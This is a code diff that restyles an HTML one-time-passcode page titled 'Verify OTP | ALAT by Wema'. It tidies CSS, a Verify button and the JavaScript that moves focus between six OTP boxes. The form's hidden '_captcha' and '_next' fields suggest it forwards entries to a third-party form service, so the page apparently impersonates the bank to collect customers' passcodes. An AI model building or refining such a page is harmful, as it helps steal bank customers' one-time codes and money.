@@ -6,17 +6,22 @@
   <title>Verify OTP | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
   <style>
-    /* Add these styles to keep all 6 OTP boxes in one line */
+    /* Main container adjustments */
+    .container {
+      max-width: 350px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    /* OTP input container */
     .formOtp {
       display: flex;
-      justify-content: center;
-      gap: 4px;
-      margin-bottom: 20px;
-      overflow-x: auto;
-      padding-bottom: 10px;
+      justify-content: space-between;
+      margin-bottom: 25px;
       width: 100%;
     }
     
+    /* Individual OTP inputs */
     .pin-input {
       width: 30px;
       height: 40px;
@@ -24,23 +29,28 @@
       font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 5px;
-      flex-shrink: 0;
     }
     
-    @media (max-width: 600px) {
+    /* Responsive adjustments */
+    @media (max-width: 400px) {
       .pin-input {
         width: 25px;
         height: 35px;
         font-size: 14px;
       }
-      .formOtp {
-        gap: 3px;
-      }
     }
     
-    /* Hide scrollbar but keep functionality */
-    .formOtp::-webkit-scrollbar {
-      display: none;
+    /* Verify button styling */
+    .verify-btn {
+      width: 100%;
+      padding: 12px;
+      border-radius: 7px;
+      border: none;
+      background: #0066FF;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
     }
   </style>
 </head>
@@ -70,7 +80,7 @@
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_next" value="otp.html">
 
-              <button type="submit" style="width: 100%; max-width: 22rem; padding: 12px; border-radius: 7px; border: none; font-weight: bold;">Verify</button>
+              <button type="submit" class="verify-btn">Verify</button>
             </form>
           </div>
         </div>
@@ -86,10 +96,8 @@
     otpInputs.forEach((input, index) => {
       // Move to next input when a digit is entered
       input.addEventListener('input', function() {
-        if (this.value.length === 1) {
-          if (index < otpInputs.length - 1) {
-            otpInputs[index + 1].focus();
-          }
+        if (this.value.length === 1 && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
         }
       });
       
@@ -131,4 +139,4 @@
 </script>
 
 </body>
-</html>
+                </html>
